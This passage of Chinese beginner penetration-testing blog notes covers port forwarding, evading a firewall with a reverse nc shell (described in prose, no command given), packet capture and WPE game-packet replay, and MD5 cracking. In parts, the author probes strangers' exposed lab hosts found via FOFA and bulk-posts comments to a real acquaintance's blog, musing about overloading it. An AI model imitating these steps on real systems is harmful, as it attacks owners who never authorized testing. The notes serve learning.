-<p>尽管如此，外网访问内网设备并非完全不可能。通过配置端口转发（Port Forwarding）或使用VPN（虚拟专用网络），你可以允许外部设备访问特定的内网设备或服务。不过，这些配置需要手动设置，并且通常仅用于特定用途，例如远程桌面访问或托管网络服务。</p>
-<p>————————————————————————————————————</p>
-<p><strong>如何解决外网无法访问内网的问题？</strong></p>
-<p>端口映射</p>
-<p>这个又叫虚拟映射，这个方法就是在连接外网的路由器上做一个端口映射的设置，具体说将访问该路由器外网地址和特定端口的服务映射到内网的一台电脑的某一个端口上。</p>
-<p><strong>其实是很通俗易懂的,外网访问的过程中将流量转发到路由器上，（也就是我们百度直接搜ip时会弹出的ip–称为出口ip），然后我们选择一个端口。使这个端口又映射到内网主机的某个端口上实现流量从外网到内网主机的精准转发desu喵</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/008jCdW0gy1hfdyq4d43tj30u00u0q74.jpg" alt="img"></p>
-<p>具体上面来说，<strong>就是在光猫+路由器上做一个虚拟映射的设置，例如，将访问122.15.244.39，端口10101的访问映射到192.168.2.2的端口10101上。</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711112852515.png" alt="image-20240711112852515"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711112917706.png" alt="image-20240711112917706"></p>
-<p>设置完成后，在外网浏览器输入：122.15.244.39:10101，则可以直接访问到服务器。<br>需要注意的是：<br>(1)<strong>公网映射时，选择的外部端口最好不选择常用的80，21等，因为路由器会屏蔽这些！！！</strong><br>(2) 服务器需要连接到包含公网IP的服务器上！</p>
-<p><strong>如何获得公网IP</strong><br>实际当中，你的光猫+路由器的那个IP地址（可以在登录路由器界面后看到）不一定是公网IP，如果不是，则以上无法完成。因为IP地址很有限，所以很多运营商给你的是私网IP。例如，你看到你的那个地址是通过PPOE得来的，就是私有的。可以参见这里<a href="https://blog.csdn.net/hongkaihua1987/article/details/106046819%E3%80%82%E8%A6%81%E8%8E%B7%E5%BE%97%E5%85%AC%E7%BD%91IP%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%89%BE%E8%BF%90%E8%90%A5%E5%95%86%EF%BC%8C%E8%A6%81%E6%B1%82%E7%BB%99%E5%85%AC%E7%BD%91IP%EF%BC%8C%E4%BB%96%E4%BB%AC%E4%BC%9A%E5%9C%A8%E5%90%8E%E5%8F%B0%E8%AE%BE%E7%BD%AE%EF%BC%8C%E8%AE%BE%E7%BD%AE%E5%AE%8C%E5%90%8E%E5%B0%B1%E6%98%AF%E5%85%AC%E7%BD%91%E7%9A%84%E4%BA%86%E3%80%82">https://blog.csdn.net/hongkaihua1987/article/details/106046819。要获得公网IP，可以找运营商，要求给公网IP，他们会在后台设置，设置完后就是公网的了。</a></p>
-<p>**</p>
-<p><strong>公网IP是动态的怎么办</strong><br>你的公网IP有了，但是他通常是动态的（登录路由器，如果是DHCP获得的，就是动态的）。所谓动态就是分给你的是变化的，当你路由器重新加电或复位后就会重新分配一个。这就有点傻了，总不能每次去查路由器吧。这里有两个办法：</p>
-<p><strong>申请固定IP</strong><br>（1）找运营商，申请一个固定的公网IP。但是有个前提，运营商只对公司分配固定IP，对个人用户是不可以的。同时公司用户必须申请公司宽带，不能是个人宽带。公司宽带的资费要比个人的贵一些。同时，如果想要申请固定IP，还需要额外收一笔费用，按月计费。</p>
-<p>转载自<a href="https://blog.csdn.net/kevinshift/article/details/122148573#31__25">从外网访问局域网服务器的六种方法_内部服务如何才能外部访问-CSDN博客</a></p>
-<p>————————————————————————————————————</p>
-</li>
-<li><p><strong>路由器的作用是什么，什么是路由？</strong></p>
-<p>比如说我们手机要访问<a href="https://link.zhihu.com/?target=http://baidu.com">http://baidu.com</a> ，必须先经过路由中转然后路由外网IP对<a href="https://link.zhihu.com/?target=http://baidu.com">http://baidu.com</a> 发送请求，百度收到后对路由响应一个网页或者 数据之类的东东。</p>
-<p>路由器接收到 <a href="https://link.zhihu.com/?target=http://baidu.com">http://baidu.com</a> 的页面后，把页面发送给你的电脑或手机。路由器知道如何给这些信息指路，路由器就是一个指路人，这就是「路由」两个字的来历。</p>
-<p>路，就是「必由之路」中的路。由，就是「必由之路」中的由（由是经过、缘由的意思）。所有的信息都要经过路由器，然后被指向一条它该去的路。<br>也就是说内网和外网就像两个隔绝的空间，无法互通，唯一的联通点就是路由器（因为路由器既有外网 IP 也有内网 IP），所以路由器有时候也被叫做「网关」，这个「关」是「一夫当关，万夫莫开」的「关」。如果路由器到电信的连接中断了，那么内网中所有的设备也就无法上网了。（这很好理解，相当于唯一一条出去的路断了）</p>
-</li>
-<li><p><strong>内网能访问内网么？</strong></p>
-<p>内网中的设备可以互相访问（比如你可以用电脑或手机进入 <a href="https://link.zhihu.com/?target=http://192.168.1.1">http://192.168.1.1</a> 来查看你的路由器），但是不能直接访问外网，内网设备想要访问外网，就必须经过路由器中转。</p>
-</li>
-<li><p><strong>外网能访问外网么？</strong></p>
-<p>外网中的设备可以互相访问（比如 <a href="https://link.zhihu.com/?target=http://qq.com">http://qq.com</a> 可以把首页发送给你的路由器，你的路由器有外网 IP），但是外网中的设备无法访问你的内网设备（这很好理解，内网是一个封闭的网络，外人进不来，所以实际上 <a href="https://link.zhihu.com/?target=http://qq.com">http://qq.com</a> 无法直接把首页放送给你的电脑和手机</p>
-<p><strong>来源于<a href="https://zhuanlan.zhihu.com/p/34521011">HTTP访问要素：IP 与 端口 - 知乎 (zhihu.com)</a></strong></p>
-</li>
-</ol>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711110331630.png" alt="image-20240711110331630"></p>
-<h2 id="2-防火墙："><a href="#2-防火墙：" class="headerlink" title="2.防火墙："></a>2.防火墙：</h2><p>xzb666-hub <strong>&lt;–&gt;</strong> aliyun</p>
-<p>xzb666-hub防火墙 <strong>–&gt;</strong> aliyun</p>
-<p>aliyun <strong>!- &gt;</strong> xzb666防火墙</p>
-<p><strong>这里准备两台外网主机，查看两台主机之间是否能够正常通讯</strong> </p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711145047314.png" alt="image-20240711145047314"></p>
-<p>也就是像现在这样，<strong>两台服务器之间通过nc建立了反弹shell的基本操作</strong></p>
-<p>然后可以发现二者都可以充当监听端，被监听端.</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711151136536.png" alt="image-20240711151136536"></p>
-<p><strong>当防火墙开启时，发现连接超时，说明入站的数据被严格过滤了，也就是说经过这一层防火墙的拦截，服务端哪怕成功被我们建立起监听也无法接收对应的弹shell等操作，也就是说吗，这里我们想要把cmd.exe弹过去想经过防火墙这一层简直是天方夜谭</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/008jCdW0gy1hriyt8rqkwj30xd0xinbv.jpg" alt="img"></p>
-<p>这也是个很生草的问题，因此我们开始用防火墙开发者的角度思考问题，便出现了一个奇妙的思路</p>
-<p><strong>防火墙绕过-正向链接&amp;反向连接&amp;内网服务器</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711150850670.png" alt="image-20240711150850670"></p>
-<p>防火墙有个特性，对入站的数据很严格，对出站的数据便放的很松，这类似于SQL注入中的一个分类，就是SQL二次注入的原理desu喵，<strong>假如我们通过服务端这里作为发出cmd.exe的对象，这时由于部署防火墙的服务端对出站的数据过滤的不是很严格，</strong>，因此shell成功被另一台外网主机所接收，这样的绕过也就可以实现了喵!!!</p>
-<p><strong>所以以后碰上防火墙的部署的话，尽量让它出来找你而不是让你出来找它，让它主动把数据给你而不是你找它讨！这样卑微desu！</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/008jCdW0gy1hfdyq4d43tj30u00u0q74.jpg" alt="img"></p>
-<h2 id="有手就行的实战desu"><a href="#有手就行的实战desu" class="headerlink" title="有手就行的实战desu"></a>有手就行的实战desu</h2><p>这里用fofa搜索对应的pikachu靶场，来打打同行（doge）</p>
-<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQozfTZKNXRTR0quy3Ca3nmSgkKsfM76uQn_g&s" alt="永雏塔菲手机壁纸- 抖音"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711153357307.png" alt="image-20240711153357307"></p>
-<p>然后这里打到了某个ip，发现功能齐全（阴险desu  打算开始做进一步入侵</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711153516754.png" alt="image-20240711153516754"></p>
-<p>–后续不具体做展示desu</p>
-<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQozfTZKNXRTR0quy3Ca3nmSgkKsfM76uQn_g&s" alt="永雏塔菲手机壁纸- 抖音"></p>
-<h1 id="Day2-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器"><a href="#Day2-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器" class="headerlink" title="Day2:Web应用-架构搭建-漏洞-HTTP数据包-代理服务器"></a>Day2:Web应用-架构搭建-漏洞-HTTP数据包-代理服务器</h1><h1 id="网站搭建前置知识"><a href="#网站搭建前置知识" class="headerlink" title="网站搭建前置知识"></a>网站搭建前置知识</h1><p>#域名，子域名，DNS，HTTP&#x2F;HTTPS，证书等</p>
-<p>第一步：准备域名，可以通过阿里云购买，服务器同理</p>
-<p>PS：倘若域名没有经过备案，那么这个域名在运营过程中只能对大陆以外的服务器进行解析，这个时候服务器可以选择香港、新加坡等离国内较近的服务器desu，（备案是需要很长时间的，如果比较急的话就没必要）</p>
-<p>第二步：将服务器基本配置配好过后，对域名进行解析，并利用阿里云自带的管理系统开始搭建网站</p>
-<p>第三步：这个时候小白可以通过宝塔平台一键搭建网站</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712161427668.png" alt="image-20240712161427668"></p>
-<h2 id="一些进阶的参考资料"><a href="#一些进阶的参考资料" class="headerlink" title="一些进阶的参考资料"></a>一些进阶的参考资料</h2><p><a href="https://blog.csdn.net/zhyl8157121/article/details/100551592">如何给你的网站套上Cloudflare（以阿里云为例）_如何套用cloudlfare-CSDN博客</a></p>
-<h1 id="Web应用环境的架构"><a href="#Web应用环境的架构" class="headerlink" title="Web应用环境的架构"></a>Web应用环境的架构</h1><p>理解不同WEB应用组成角色功能架：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712094332684.png" alt="image-20240712094332684"></p>
-<p>不同的架构自然可能出现的安全漏洞不同</p>
-<h1 id="Web安全漏洞分类"><a href="#Web安全漏洞分类" class="headerlink" title="Web安全漏洞分类"></a>Web安全漏洞分类</h1><p>这里不过多赘述</p>
-<p>但需要明白一个原理</p>
-<p>如图的这些漏洞都是代码实现功能过程中代码不够完善从而出现的</p>
-<h1 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712094451574.png" alt="image-20240712094451574"></h1><p>同时，根据上述架构的分类：从语言上，中间件层面上，服务器操作系统等不同层面上都会出现一些安全问题。</p>
-<h1 id="HTTP数据包和代理"><a href="#HTTP数据包和代理" class="headerlink" title="HTTP数据包和代理"></a>HTTP数据包和代理</h1><p>图示是一个最基本的请求图示</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712095029242.png" alt="image-20240712095029242"></p>
-<p>加入所谓的代理拦截后</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712095104496.png" alt="image-20240712095104496"></p>
-<p>浏览器先传入代理，代理再传入服务器，对应的返回的过程也需要经过代理的中转。 </p>
-<h2 id="案例–pax学长的评论区desu！！"><a href="#案例–pax学长的评论区desu！！" class="headerlink" title="案例–pax学长的评论区desu！！"></a>案例–pax学长的评论区desu！！</h2><p><strong>比方说我们对某个网站点赞</strong></p>
-<p>这里找到了pax学长的博客，随便点开一篇博文，发现其评论区功能正常运营，并且有点赞功能。Satoru打算套上Sherlock的马甲干点坏事情，发现Pax所用的butterfly框架甚至连头像都自动爬取上传好了（替你造马甲的框架，他真的，我哭死） 接下来准备进行对评论刷赞，看看是否成立</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712100613082.png" alt="image-20240712100613082"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712110446321.png" alt="image-20240712110446321"></p>
-<p>这里对点赞请求进行抓包，本想通过User-Agent在不同的浏览器中对同一个id点赞，但发现由于token机制，以作者当前的水平想实现python脚本自动化抓取token是很困难的，因此转换另一个思路，抓取评论时的请求，通过Burp Intruder不断构造新的评论，开始炸库。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712111235234.png" alt="image-20240712111235234"></p>
-<p>不断构造评论显然是可以实现的，毕竟是评论区自带的功能，不过利用这点依然是可以搞一些事情的</p>
-<p>首先这个评论区功能是支持上传文件的，如果我上传一系列图片进去，是否有可能拖垮pax博客的负载？</p>
-<p>同时这个马甲是支持信息伪造的，假设我传入一些有害网站作为个人马甲，这是否又是一层攻击？</p>
-<p>再不济，我挂着Burp Intruder模块批量发包，积少成多的同时并且在pax的所有文章下发送一些无用信息，这只是拖累负载而已，但假设我传入的是有害的信息呢？这也是需要考虑的</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712111940495.png" alt="image-20240712111940495"></p>
-<h1 id="Day3-基础入门-抓包-封包-APP-小程序-PC应用-Web应用"><a href="#Day3-基础入门-抓包-封包-APP-小程序-PC应用-Web应用" class="headerlink" title="Day3:基础入门-抓包&amp;封包&amp;APP&amp;小程序&amp;PC应用&amp;Web应用"></a>Day3:基础入门-抓包&amp;封包&amp;APP&amp;小程序&amp;PC应用&amp;Web应用</h1><h1 id="学会对不同对象采用不同抓包封包抓取"><a href="#学会对不同对象采用不同抓包封包抓取" class="headerlink" title="学会对不同对象采用不同抓包封包抓取"></a>学会对不同对象采用不同抓包封包抓取</h1><p>什么是抓包：</p>
-<p>抓包就是抓取相关应用的一些数据，如果我们进行安全测试的话，有些应用的目标是会直接给到你的，但有些目标却是未知的</p>
-<p>对于这些看不见的目标，我们可以通过抓取数据包来解决。</p>
-<p>很经典的web流程，在任意一个浏览器通过F12打开网络（或者叫做networkl）</p>
-<p>这个时候浏览器会起一个监听的进程，用于抓取基本的数据包</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240714153412205.png" alt="image-20240714153412205"></p>
-<p>这就是很经典的一个单纯抓包，并没有对数据包做任何的额外操作。</p>
-<p>同时对应的它也会展示一些加载的资源，比如前端展示的js或css等</p>
-<p>还有一种可能，数据包是会被封装在微信小程序，app或者一些电脑的应用中，这个时候就需要一些专门的工具用于模拟对应的环境</p>
-<h1 id="抓包应用对象"><a href="#抓包应用对象" class="headerlink" title="抓包应用对象"></a>抓包应用对象</h1><h2 id="WEB应用站点（网站）"><a href="#WEB应用站点（网站）" class="headerlink" title="WEB应用站点（网站）"></a>WEB应用站点（网站）</h2><p>浏览器审查查看元素网络监听</p>
-<h2 id="APP-小程序-PC抓包-HTTP-S数据-—Burpsuite-Charles-Fiddler"><a href="#APP-小程序-PC抓包-HTTP-S数据-—Burpsuite-Charles-Fiddler" class="headerlink" title="APP&amp;小程序&amp;PC抓包-HTTP&#x2F;S数据  —Burpsuite&amp;Charles&amp;Fiddler"></a>APP&amp;小程序&amp;PC抓包-HTTP&#x2F;S数据  —Burpsuite&amp;Charles&amp;Fiddler</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">环境配置</span><br><span class="line">1、安卓模拟器安装搭建：</span><br><span class="line">雷电、逍遥、夜神等自行安装</span><br><span class="line">2、工具相关证书安装</span><br><span class="line">Burpsuite&amp;Charles&amp;Fiddler</span><br><span class="line">这三样工具看自己使用的是哪一样，对应的看工具官方手册或一些教程即可安装对应的证书</span><br><span class="line">3.封包抓取</span><br></pre></td></tr></table></figure>
-
-<p>对应的记得安装证书，修改模拟器代理即可</p>
-<p>在这里个人建议使用Charles配合Burpsuite，对小程序和app等进行抓包也可以直接配合手机使用，这里也有配套的教程.</p>
-<h2 id="程序进程-网络接口-其他协议抓包-–-Wireshark-科来网络分析系统"><a href="#程序进程-网络接口-其他协议抓包-–-Wireshark-科来网络分析系统" class="headerlink" title="程序进程&amp;网络接口&amp;其他协议抓包 – Wireshark&amp;科来网络分析系统"></a>程序进程&amp;网络接口&amp;其他协议抓包 – Wireshark&amp;科来网络分析系统</h2><p>当有一些程序走的是非web协议，这个时候burp和charles本质上是派不上用场的，这个时候我们也可以选择使用wireshark抓到类似UDP协议和IDMP协议等。</p>
-<h2 id="通讯类应用封包分析发送接收-–WPE四件套封包-科来网络分析系统"><a href="#通讯类应用封包分析发送接收-–WPE四件套封包-科来网络分析系统" class="headerlink" title="通讯类应用封包分析发送接收 –WPE四件套封包&amp;科来网络分析系统"></a>通讯类应用封包分析发送接收 –WPE四件套封包&amp;科来网络分析系统</h2><p>封包和抓包是两个本质不同的概念，对通讯类应用，比如游戏这类实时交互的进程，在不断产生流量交互的应用，使用对应的网络分析系统对本机的流量包进行分析，然后对协议的状态进行对应的观察</p>
-<p>比方说<strong>打开模拟器，想要抓取某传奇手游的数据包</strong>。</p>
-<p>这个时候利用科来网络分析系统对模拟器网段流量进行分析，可以通过TCP的状态发掘正在运行的进程，通过排除法（在模拟器中开始畅玩游戏（），发现相对较活跃的流量）可以发现当前运行的数据包中哪个是对应游戏的数据包喵</p>
-<p><strong>类似这种游戏，一般走的都是TCP协议</strong>，因为HTTP使用请求-响应模型，客户端发送请求，服务器返回响应。因此HTTP模型适合于Web浏览中一次性数据获取的场景却不适用于游戏。</p>
-<p>可能这个时候就会有人问了：SatoruSatoru，<strong>这哪里是Web渗透啊？分明就是抓包而已，这能有啥？</strong></p>
-<p>Satoru这个时候就会说了：<strong>抓个包其实是很简单的事，但是拿到真实IP开始扫描资产，看看端口上其他的服务这种操作就要考虑的很多了（套用公式就是快）</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240714210927280.png" alt="image-20240714210927280"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240714210940142.png" alt="image-20240714210940142"></p>
-<h2 id="真正意义上的封包技术"><a href="#真正意义上的封包技术" class="headerlink" title="真正意义上的封包技术"></a>真正意义上的封包技术</h2><p>详解wpe封包：</p>
-<p>WPE是一个强大的网络封包编辑器，它可以截取网络上的信息，修改封包的数据，一般在安全测试中可以用来调试数据通讯的地址</p>
-<p>封包指将网络传输过程中封片传输的数据，比方说一个游戏中，回城由十个数据包组成，那么WPE对我们发送的数据包进行整合封装，将分片传输的数据重新整合成一套数据包，然后重新发送，达到在游戏外实现功能的效果</p>
-<h3 id="封包概念解释"><a href="#封包概念解释" class="headerlink" title="封包概念解释"></a>封包概念解释</h3><p><strong>封包（Packet）</strong> 是指在网络通信中，数据被分割成小块并通过网络传输的基本单位。每个封包通常包括头部（Header）和数据（Data）部分：</p>
-<ul>
-<li><strong>头部</strong>：包含控制信息，例如源地址、目的地址、序列号、协议信息等。</li>
-<li><strong>数据</strong>：实际传输的数据内容。</li>
-</ul>
-<p>封包在网络中传输时，通过路由器和交换机等设备进行传递，最终到达目的地。封包技术是网络通信的基础，通过将大块数据分割成小块，可以实现高效和可靠的传输。</p>
-<h3 id="封包编辑（Packet-Editing）"><a href="#封包编辑（Packet-Editing）" class="headerlink" title="封包编辑（Packet Editing）"></a>封包编辑（Packet Editing）</h3><p>封包编辑指的是捕获、分析、修改和重放网络封包的过程。这通常用于网络调试、性能测试、漏洞利用等场景。WPE（Winsock Packet Editor）是常用的封包编辑工具之一。</p>
-<h3 id="WPE（Winsock-Packet-Editor）封包编辑技术"><a href="#WPE（Winsock-Packet-Editor）封包编辑技术" class="headerlink" title="WPE（Winsock Packet Editor）封包编辑技术"></a>WPE（Winsock Packet Editor）封包编辑技术</h3><p>WPE Pro 是一种流行的网络封包编辑工具，用于捕获和修改通过 Windows 网络堆栈传输的数据包。以下是使用 WPE 进行封包编辑的步骤：</p>
-<h4 id="1-下载并安装-WPE-Pro"><a href="#1-下载并安装-WPE-Pro" class="headerlink" title="1.下载并安装 WPE Pro"></a>1.下载并安装 WPE Pro</h4><p>首先，从可信的来源下载并安装 WPE Pro。</p>
-<h4 id="2-打开目标程序"><a href="#2-打开目标程序" class="headerlink" title="2. 打开目标程序"></a>2. 打开目标程序</h4><p>启动你想要捕获和编辑封包的应用程序。例如，一个网络游戏或聊天程序。</p>
-<h4 id="3-启动-WPE-Pro"><a href="#3-启动-WPE-Pro" class="headerlink" title="3. 启动 WPE Pro"></a>3. 启动 WPE Pro</h4><p>启动 WPE Pro，并在工具界面中选择“Target Program”按钮，选择你要监控的目标程序。</p>
-<h4 id="4-捕获封包"><a href="#4-捕获封包" class="headerlink" title="4. 捕获封包"></a>4. 捕获封包</h4><p>在 WPE Pro 中，点击“Play”按钮开始捕获封包。然后在目标程序中执行一些操作（如发送消息、移动角色等）。</p>
-<h4 id="5-停止捕获并分析封包"><a href="#5-停止捕获并分析封包" class="headerlink" title="5. 停止捕获并分析封包"></a>5. 停止捕获并分析封包</h4><p>完成操作后，点击“Stop”按钮停止捕获。你将看到捕获到的封包列表。</p>
-<h4 id="6-修改封包"><a href="#6-修改封包" class="headerlink" title="6. 修改封包"></a>6. 修改封包</h4><p>选中你想要修改的封包，右键选择“Send”或“Send to Send List”。在“Send List”中，你可以编辑封包的数据内容。修改完成后，点击“Send”按钮发送修改后的封包。</p>
-<h4 id="示例步骤："><a href="#示例步骤：" class="headerlink" title="示例步骤："></a>示例步骤：</h4><p>假设你在一个在线游戏中想要修改发送的聊天消息：</p>
-<ol>
-<li>在游戏中发送一条消息（如“Hello”）。</li>
-<li>在 WPE Pro 中捕获到相应的封包。</li>
-<li>找到包含“Hello”消息的封包，右键选择“Send”或“Send to Send List”。</li>
-<li>在编辑器中将“Hello”修改为其他内容（如“Hi there”）。</li>
-<li>点击“Send”按钮发送修改后的封包，观察游戏中的变化。</li>
-</ol>
-<p>也可以封装一个回城功能（doge）,然后通过发送整合后的数据包就可以实现游戏外回城的功能（doge）</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240714213902020.png" alt="image-20240714213902020"></p>
-<p>所以封包和wireshark监听查找进程的本质区别在于封包是一组整合的数据包，wireshark查找进程是一堆零散的数据包</p>
-<p>步骤：</p>
-<p>1.首先在模拟器中先装上代理机器人</p>
-<p>2.对应的打开ccproxy设置代理</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">四件套示意图</span><br><span class="line">apk --&gt; ccproxy  --&gt;wpe监听cc进程，实现封包抓包</span><br><span class="line"></span><br><span class="line">burp charles</span><br><span class="line">模拟器设置证书后，设置代理，运行工具的本机IP 端口</span><br><span class="line">burpsuite茶杯 配置代理 监听抓取</span><br><span class="line"></span><br><span class="line">wireshark 科来  不需要设置任何东西</span><br><span class="line">只是监听全频段网络接口</span><br></pre></td></tr></table></figure>
-
-<p>这里也可以用<strong>下雪的傻瓜式封包监听工具</strong>，不过现在一般模拟器都已经上了一层防护了，不会轻易的让你使用模拟器对应的进程名，所以这个时候更新工具版本或者选择一些老版本模拟器（）说不定有奇效</p>
-<p>当然这是因为WPE工具已经太老了，基本的原理连逍遥安卓论坛都能讲明白，加上一层比较基本的防护器就可以防御住了，这后面再细说</p>
-<p>雷电模拟器的进程一般是这个</p>
-<p>X64进程名|Ld9BoxHeadless.exe|PID|30320</p>
-<p>但是进程ID可能会实时改变（？）</p>
-<p>在我封包成功一次过后雷电模拟器好像把PID给换了，细思极恐</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715145004014.png" alt="image-20240715145004014"></p>
-<h1 id="抓包应用协议"><a href="#抓包应用协议" class="headerlink" title="抓包应用协议"></a>抓包应用协议</h1><p>分为Web协议和非Web协议</p>
-<h1 id="抓包应用意义"><a href="#抓包应用意义" class="headerlink" title="抓包应用意义"></a>抓包应用意义</h1><p>把app中的一些数据或者一些信息提取出来，就是这么简单，然后将这些信息用于对应的安全攻防。</p>
-<h1 id="封包应用意义"><a href="#封包应用意义" class="headerlink" title="封包应用意义"></a>封包应用意义</h1><p><strong>WPE四件套封包&amp;科来网络分析系统  Wireshark</strong></p>
-<p><strong>Burpsuite&amp;Charles&amp;Fiddler</strong></p>
-<h2 id="傻瓜式封包流程"><a href="#傻瓜式封包流程" class="headerlink" title="傻瓜式封包流程"></a>傻瓜式封包流程</h2><p>封包工具可以将类似于游戏这种实时交互的网站做完整的监听而非拦截</p>
-<h3 id="进程获取"><a href="#进程获取" class="headerlink" title="进程获取"></a>进程获取</h3><p>没有发现模拟器对应的进程，那么封包也是天方夜谭</p>
-<p>首先通过Wireshark或者科来网络分析系统监听本机进程，并在游戏中多进行释放技能，领取奖励等数据包交互很多的操作，可以发现对应的字节波动大的进程，通过进程名推敲一下看看是否就是这个模拟器的进程。</p>
-<h3 id="最后封包"><a href="#最后封包" class="headerlink" title="最后封包"></a>最后封包</h3><p>后续直接用封包工具对模拟器起一个监听，然后打开监听，在游戏内进行想要封包的操作（例如回城等），点击回城后关闭监听开始测试抓取到的数据包，如果选中的数据包发送后能够成功实现该功能，则说明封包成功（虽然Burpsuite其实也能做到直接监听对应模拟器配置的虚拟网卡）</p>
-<h2 id="进阶封包流程"><a href="#进阶封包流程" class="headerlink" title="进阶封包流程"></a>进阶封包流程</h2><p>进阶的封包无非是在模拟器中装入代理机器人，后续代理机器人将抓到的数据包传回到本机的CCproxy（也是工具），CCproxy对应的进程则被WPE所监听，但由于这个流程已经太老了，模拟器以及游戏本身可能都有对应的防护，所以一般傻瓜式封包会比进阶封包更容易抓到包。</p>
-<p><strong>后续有条件一定要自己尝试写出来封包监听工具，毕竟公开的工具会被ban，但公开的原理不会，通过进阶封包这里学得原理，自己做个封包监听工具又有何不可呢。</strong></p>
-]]></content>
-      <categories>
-        <category>Penetration Testing Basic</category>
-      </categories>
-      <tags>
-        <tag>pr0gram</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>从0开始的渗透Day4-6desu</title>
-    <url>/2024/07/15/%E4%BB%8E3%E5%BC%80%E5%A7%8B%E7%9A%84%E6%B8%97%E9%80%8F1/</url>
-    <content><![CDATA[<h1 id="如读者有未授权渗透行为，后果自负，本站仅作学习用途"><a href="#如读者有未授权渗透行为，后果自负，本站仅作学习用途" class="headerlink" title="如读者有未授权渗透行为，后果自负，本站仅作学习用途"></a>如读者有未授权渗透行为，后果自负，本站仅作学习用途</h1><h1 id="Day4-30余种加解密编码进制-Web-数据库-系统-代码-参数值"><a href="#Day4-30余种加解密编码进制-Web-数据库-系统-代码-参数值" class="headerlink" title="Day4:30余种加解密编码进制&amp;Web &amp;数据库&amp;系统&amp;代码&amp;参数值"></a>Day4:30余种加解密编码进制&amp;Web &amp;数据库&amp;系统&amp;代码&amp;参数值</h1><h2 id="加解密编码进制"><a href="#加解密编码进制" class="headerlink" title="加解密编码进制"></a>加解密编码进制</h2><p>识别算法编码类型</p>
-<p>1.看密文位数</p>
-<p>2.看密文的特征（数字，字符，大小写，符号等）</p>
-<p>3.看当前密文存在的地方（Web，数据库，操作系统等应用）</p>
-<p>演示案例如下，接下来会从这些方面出发</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715163704329.png" alt="image-20240715163704329"></p>
-<p>详细列举</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715163856227.png" alt="image-20240715163856227"></p>
-<p>对于一些密码算法，类似md5这类不可逆的密码算法</p>
-<p>这个时候解密的方式就有：<strong>枚举和碰撞</strong></p>
-<p><strong>解密不通过算法解密，而是尝试生成很多的加密或对应明文的字符来枚举</strong></p>
-<p>同时加密的应用场景比较多，这里列举出这些</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715164423363.png" alt="image-20240715164423363"></p>
-<p>加密存储相对明文存储而言，不同之处就在于在攻防过程中，如果你的密文设置的足够复杂，其实也可以防止攻击端进一步攻击网络资产。</p>
-<p>—-1—</p>
-<p>类似于最基本的md5加密，类似个人博客这种最基本的站点，一般会采取md5加密，这个时候假设你进入了数据库，可以直接利用某些线上工具完成解密</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715170018370.png" alt="10"></p>
-<p>—2—</p>
-<p>对应了<strong>国外论坛discuz类的站点</strong>采用了md5+salt加密的方式，在本身就用md5加密的条件下还额外加入了“salt“字段，这个时候使加密更加完善，攻击者在未知网站信息或存储机制的情况下难以进一步操作</p>
-<p>不过还是有机会通过一些信息的收集得知其加密的机制的</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715165911780.png" alt="image-20240715165911780"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715170242476.png" alt="image-20240715170242476"></p>
